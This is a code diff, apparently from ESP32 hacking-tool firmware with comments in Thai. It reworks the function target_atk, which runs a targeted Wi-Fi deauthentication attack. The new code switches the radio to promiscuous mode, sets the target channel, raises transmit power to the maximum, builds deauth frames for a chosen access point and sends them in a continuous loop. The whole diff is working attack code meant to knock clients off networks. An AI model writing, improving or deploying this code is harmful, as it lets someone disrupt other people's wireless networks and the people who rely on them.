@@ -745,25 +745,42 @@ void target_atk(String tssid, String mac, uint8_t channel) {
     resetGlobalState();
     cleanlyStopWebUiForWiFiFeature();
 
-    if (!wifi_atk_setWifi()) return;
+    // ---------- 1. ล้าง WiFi เก่า แล้วตั้งโหมด STA + promiscuous ----------
+    WiFi.disconnect(true);
+    WiFi.mode(WIFI_OFF);
+    delay(100);
+    
+    // ตั้งค่าเริ่มต้นใหม่ (เหมือน tryMonitorMode)
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    esp_wifi_init(&cfg);
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    esp_wifi_set_promiscuous(true);
+    
+    // ตั้ง channel (ลองซ้ำถ้าไม่สำเร็จ)
+    esp_err_t err = ESP_FAIL;
+    for (int retry = 0; retry < 3; retry++) {
+        err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+        if (err == ESP_OK) break;
+        delay(10);
+    }
+    if (err != ESP_OK) {
+        // fallback: ถ้าเปลี่ยนไม่ได้ (น้อยมาก) ใช้ AP mode
+        WiFi.mode(WIFI_AP);
+        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    }
+    esp_wifi_set_max_tx_power(78);  // กำลังส่งสูงสุด
 
-    // สร้าง ap_record ชั่วคราวสำหรับ wsl_bypasser
-    wifi_ap_record_t target_ap;
-    memset(&target_ap, 0, sizeof(target_ap));
-    // แปลง MAC string เป็น bytes
+    // ---------- 2. เตรียม deauth frame (ยิงจาก STA interface) ----------
     uint8_t bssid[6];
     sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
-    memcpy(target_ap.bssid, bssid, 6);
-    target_ap.primary = channel;
 
-    // ใช้เวทเดียวกับ Deauth Flood เพื่อตั้ง channel และเตรียม frame
-    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-    wsl_bypasser_send_raw_frame(&target_ap, channel, _default_target);
+    // สร้าง deauth frame แบบเดียวกับ stationDeauth (ใช้ buildOptimizedDeauthFrame)
+    uint8_t deauth_frame[26];
+    buildOptimizedDeauthFrame(deauth_frame, _default_target, bssid, bssid, 0x07, false);
 
-    // ===== Attack loop =====
+    // ---------- 3. วนส่ง deauth ----------
     const uint16_t UPDATE_INTERVAL_MS = 2000;
-    const uint8_t FRAMES_PER_SEND = 3;
     uint32_t lastUpdateTime = millis();
     uint32_t frameCount = 0;
     bool needsRedraw = true;
@@ -786,8 +803,9 @@ void target_atk(String tssid, String mac, uint8_t channel) {
             needsRedraw = false;
         }
 
-        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-        frameCount += FRAMES_PER_SEND;
+        // ส่งผ่าน STA interface (เหมือน stationDeauth)
+        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+        frameCount++;
 
         uint32_t currentTime = millis();
         if (currentTime - lastUpdateTime >= UPDATE_INTERVAL_MS) {
@@ -815,7 +833,10 @@ void target_atk(String tssid, String mac, uint8_t channel) {
         }
     }
 
-    wifi_atk_unsetWifi();
+    // คืนค่าปกติ
+    esp_wifi_set_promiscuous(false);
+    WiFi.mode(WIFI_OFF);
+    wifiDisconnect();  // หรือ wifi_atk_unsetWifi() ถ้าต้องการ
     returnToMenu = true;
 }
 
